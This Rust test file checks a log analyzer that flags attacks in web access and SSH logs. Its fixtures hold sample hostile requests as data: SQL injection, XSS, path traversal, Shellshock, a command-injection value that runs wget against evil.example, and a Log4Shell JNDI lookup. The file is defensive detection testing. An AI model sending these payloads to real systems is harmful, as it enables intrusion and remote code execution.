// SPDX-License-Identifier: Apache-2.0
use super::*;

fn web_line(ip: &str, request: &str, status: u16, ua: &str) -> String {
    format!(r#"{ip} - - [09/Nov/2026:10:00:00 +0000] "{request}" {status} 512 "-" "{ua}""#)
}

fn web_log() -> String {
    let mut lines = vec![
        web_line("203.0.113.5", "GET / HTTP/1.1", 200, "Mozilla/5.0"),
        web_line("198.51.100.7", "GET /item?id=1%27%20OR%20%271%27=%271 HTTP/1.1", 200, "sqlmap/1.7.2#stable (https://sqlmap.org)"),
        web_line("198.51.100.7", "GET /item?id=1%2520UNION%2520SELECT%2520password%2520FROM%2520users HTTP/1.1", 500, "sqlmap/1.7.2"),
        web_line("198.51.100.8", "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", 200, "Mozilla/5.0"),
        web_line("198.51.100.8", "GET /download?file=../../../../etc/passwd HTTP/1.1", 400, "Mozilla/5.0"),
        web_line("198.51.100.9", "GET /ping?host=127.0.0.1;wget%20http://evil.example/x.sh HTTP/1.1", 200, "curl/8.5"),
        web_line("198.51.100.10", "GET / HTTP/1.1", 200, "${jndi:ldap://evil.example/a}"),
        web_line("198.51.100.11", "GET /cgi-bin/status HTTP/1.1", 200, "() { :; }; /bin/bash -c 'id'"),
        web_line("198.51.100.12", "GET /.git/config HTTP/1.1", 200, "Mozilla/5.0"),
        web_line("198.51.100.12", "GET /.env HTTP/1.1", 404, "Mozilla/5.0"),
        web_line("198.51.100.13", "GET /api/me?access_token=abcdef1234567890abcdef&x=1' or 1=1 HTTP/1.1", 200, "Mozilla/5.0"),
    ];
    for i in 0..120 {
        lines.push(web_line("192.0.2.50", &format!("GET /hidden-{i} HTTP/1.1"), 404, "gobuster/3.6"));
    }
    for _ in 0..25 {
        lines.push(web_line("192.0.2.60", "POST /wp-login.php HTTP/1.1", 200, "Mozilla/5.0"));
    }
    lines.join("\n")
}

fn by_rule<'a>(r: &'a Report, rule: &str) -> &'a Detection {
    r.detections.iter().find(|d| d.rule == rule).unwrap_or_else(|| panic!("{rule} in {:?}", r.detections.iter().map(|d| &d.rule).collect::<Vec<_>>()))
}

#[test]
fn web_access_logs_show_attacks_scans_and_guessing() {
    let r = analyze(std::io::Cursor::new(web_log())).unwrap();
    assert_eq!((r.kind.as_str(), r.lines, r.recognised), ("web", 156, 156));
    assert_eq!((r.first.as_str(), r.last.as_str()), ("09/Nov/2026:10:00:00 +0000", "09/Nov/2026:10:00:00 +0000"));
    let sqli = by_rule(&r, "WEB-SQLI");
    assert_eq!(sqli.count, 3, "quoted, double-encoded UNION SELECT, and or 1=1");
    assert_eq!(sqli.sources[0].ip, "198.51.100.7");
    for rule in ["WEB-XSS", "WEB-TRAVERSAL", "WEB-COMMAND-INJECTION"] {
        assert_eq!(by_rule(&r, rule).count, 1, "{rule}");
    }
    assert_eq!((by_rule(&r, "WEB-LOG4SHELL").severity.as_str(), by_rule(&r, "WEB-LOG4SHELL").count), ("high", 1), "found in the User-Agent");
    assert_eq!(by_rule(&r, "WEB-SHELLSHOCK").count, 1);
    assert_eq!((by_rule(&r, "WEB-SENSITIVE-SERVED").severity.as_str(), by_rule(&r, "WEB-SENSITIVE-SERVED").count), ("high", 1), ".git/config answered with 200");
    assert_eq!(by_rule(&r, "WEB-SENSITIVE-PROBED").count, 1);
    assert_eq!(by_rule(&r, "WEB-SCANNER").count, 122, "sqlmap and gobuster user agents");
    let discovery = by_rule(&r, "WEB-CONTENT-DISCOVERY");
    assert_eq!((discovery.sources.len(), discovery.sources[0].ip.as_str(), discovery.count), (1, "192.0.2.50", 120));
    assert_eq!(by_rule(&r, "WEB-PASSWORD-GUESSING").sources[0].ip, "192.0.2.60");
    // the most severe first, and a token in a logged URL is redacted in the examples
    assert_eq!(r.detections[0].severity, "high");
    let json = serde_json::to_string(&r).unwrap();
    assert!(!json.contains("abcdef1234567890abcdef"), "tokens in example lines are redacted");
    let top = &r.clients[0];
    assert_eq!((top.ip.as_str(), top.requests, top.client_errors), ("192.0.2.50", 120, 120));
}

fn ssh_log() -> String {
    let mut lines = Vec::new();
    for i in 0..12 {
        lines.push(format!("Nov  9 13:45:{i:02} web1 sshd[1201]: Failed password for invalid user user{i} from 203.0.113.9 port 50{i:03} ssh2"));
    }
    lines.push("Nov  9 13:46:00 web1 sshd[1202]: Accepted password for admin from 203.0.113.9 port 50999 ssh2".into());
    lines.push("Nov  9 13:47:00 web1 sshd[1203]: Accepted publickey for root from 10.0.0.2 port 40000 ssh2: RSA SHA256:abc".into());
    for i in 0..150 {
        lines.push(format!("Nov  9 14:{:02}:{:02} web1 sshd[2000]: Failed password for root from 198.51.100.99 port 6{i:04} ssh2", i / 60, i % 60));
    }
    lines.push("Nov  9 15:00:00 web1 sshd[3000]: Invalid user oracle from 192.0.2.70 port 1234".into());
    lines.push("Nov  9 15:00:01 web1 CRON[3001]: pam_unix(cron:session): session opened for user root".into());
    lines.join("\n")
}

#[test]
fn ssh_logs_show_guessing_and_suspicious_logins() {
    let r = analyze(std::io::Cursor::new(ssh_log())).unwrap();
    assert_eq!(r.kind, "ssh");
    assert_eq!((r.lines, r.recognised), (166, 165), "the cron line is not an SSH event");
    assert_eq!((r.first.as_str(), r.last.as_str()), ("Nov  9 13:45:00", "Nov  9 15:00:00"));
    let brute = by_rule(&r, "SSH-BRUTE-FORCE");
    assert_eq!((brute.severity.as_str(), brute.count, brute.sources.len()), ("high", 162, 2), "100 or more failures from one client makes it high");
    assert_eq!(brute.sources[0].ip, "198.51.100.99");
    assert!(!brute.sources[0].examples.is_empty());
    let after = by_rule(&r, "SSH-SUCCESS-AFTER-FAILURES");
    assert_eq!((after.severity.as_str(), after.sources[0].ip.as_str()), ("high", "203.0.113.9"));
    assert_eq!(by_rule(&r, "SSH-ROOT-LOGIN").sources[0].ip, "10.0.0.2");
    assert_eq!(by_rule(&r, "SSH-PASSWORD-LOGIN").count, 1, "the publickey login is not a password login");
    assert!(by_rule(&r, "SSH-USER-ENUMERATION").detail.contains("13 different"), "12 from the failures and oracle");
}

#[test]
fn other_text_and_decoding() {
    let r = analyze(std::io::Cursor::new("hello\nworld\n")).unwrap();
    assert_eq!((r.kind.as_str(), r.recognised), ("unknown", 0));
    assert!(r.warnings[0].contains("No line was recognised"));
    assert_eq!(percent_decode("%E2%82%AC+%zz%4"), "€ %zz%4");
    let mixed = format!("{}\n{}", web_line("1.2.3.4", "GET / HTTP/1.1", 200, "x"), "Nov  9 13:46:00 h sshd[1]: Accepted publickey for bob from 1.2.3.4 port 1 ssh2");
    assert_eq!(analyze(std::io::Cursor::new(mixed)).unwrap().kind, "mixed");
}
